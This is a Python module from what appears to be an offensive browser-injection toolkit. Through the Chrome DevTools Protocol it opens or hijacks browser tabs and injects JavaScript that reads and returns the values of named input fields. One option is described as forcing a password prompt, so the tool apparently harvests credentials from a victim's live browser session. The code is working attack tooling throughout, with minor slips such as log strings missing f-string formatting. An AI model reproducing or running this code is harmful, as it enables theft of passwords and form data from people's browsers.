import logging
import os
import coloredlogs
from chromeinjector.chromeinjector import ChromeInjector
import sys
import re
from string import Template
from cocktails.cocktailshelper import CocktailsHelper
assert sys.version_info >= (3, 11)

class FindValues:
    """Used to execute JS that navigates
    DOM of target page(s) to find values of
    input boxes
    """
    current_file_path = __file__
    current_directory = os.path.dirname(current_file_path)
    fp = current_directory+'/recipes_js_templates/findvalues0.js.template'
    get_inputs_js_temp = Template(CocktailsHelper.oneline_script(
        file_path=fp))
    fp = current_directory+'/recipes_js_templates/findvalues1.js'
    set_ret_js = CocktailsHelper.oneline_script(
        file_path=fp)

    @classmethod
    def find(cls, injector: ChromeInjector,
                    inputs: set,
                    exact_input: bool = False,
                    pre_sleep: float = 0.0,
                    sleep: float = 0.0,
                    pre_script_sleep: float = 0.0,
                    url: str = None,
                    new_session: bool = False,
                    new_window: bool = False,
                    background: bool = False,
                    switch_tabs: bool = False,
                    regex: re.Pattern = None,
                    ws_url: str = None,
                    first_target: bool = False) -> tuple:
        """Uses JS to navigate DOM and extract values of input boxes

        Keyword arguments:
        injector -- ChromeInjector instance
        inputs -- set of input id strings to search for
        exact_input -- bool flag to only search for exact input id strings (default: False)
        pre_sleep -- float of sleep time to let initial page load (default: 0.0)        
        sleep -- float of sleep time to stay on page (default: 0.0)
        pre_script_sleep -- float of sleep (after pre_sleep and/or sleep) to wait to begin script exec (default: 0.0)
        url -- string of url to open in new tab or new window
        new_session -- open new page in new session (e.g. to ensure password prompt)
        new_window -- bool flag to open in new window or not (default: False)
        background -- bool flag to open backgrounded or not (default: False)
        switch_tabs -- bool flag to switch to new tab to let load (default: False)
        ws_url -- string of WS URL to execute on (default: None)
        regex -- regex of target tab (default: None)
        first_target -- only execute on first target (default: True)
        """
        logger = logging.getLogger(__name__)
        # Either open a new window or attack one already open
        target_id = None
        if (url and (ws_url or regex or first_target)):
            logger.error('Cannot use url with ws_url, first_target or regex')
            return None

        if url:
            ws_url, target_id = CocktailsHelper.prepare_new_page(injector, url,
                        pre_sleep=pre_sleep,
                        sleep=sleep, final_sleep=pre_script_sleep,
                        new_session=new_session, new_window=new_window,
                        switch_tabs=switch_tabs, background=background)

        logger.info("Creating JS")
        search = ""
        if exact_input:
            id_seach = "id"
        else:
            id_seach = "id*"

        if not inputs:
            logger.warning("inputs of len zero, finding all inputs")
            logger.warning("not fully implmented. not using null inputs yet")
            logger.warning("window left open")
            # Create search for any input to-do:
            return
        elif len(inputs) == 1:
            # Create one search
            search = 'input['+id_seach+'="'+next(iter(inputs))+'"]'
        else:
            # Create multiple input search
            for index, inputfield in enumerate(inputs):
                if index == 0:
                    search += 'input['+id_seach+'="'+inputfield+'"]'
                else:
                    search += ', input['+id_seach+'="'+inputfield+'"]'

        logger.info("Sending JS to enum inputs")
        get_inputs_js = cls.get_inputs_js_temp.substitute(inputs=search)
        logger.debug("JS: {get_inputs_js}")
        injector.cdp_eval_script(get_inputs_js, ws_url= ws_url,
                                            returnBV = True, silent= True,
                                            regex=regex, first_target=first_target)
        logger.info("Sending JS create array of found values")
        logger.debug("JS: {set_ret_js}")
        injector.cdp_eval_script(cls.set_ret_js, ws_url= ws_url,
                                    returnBV = True, silent= True,
                                    regex=regex, first_target=first_target)
        logger.info("Sending JS to retrieve found values")
        ret_func = "function f(ret){return ret;}; f(ret);"
        logger.debug("JS: {ret_func}")
        results = injector.cdp_eval_script(ret_func, ws_url= ws_url,
                                            returnBV = True, silent= True,
                                            regex=regex, first_target=first_target)
        
        # Only close if we acquired target_id by opening a new page
        if target_id:
            injector.cdp_close_window(target_id)
        return results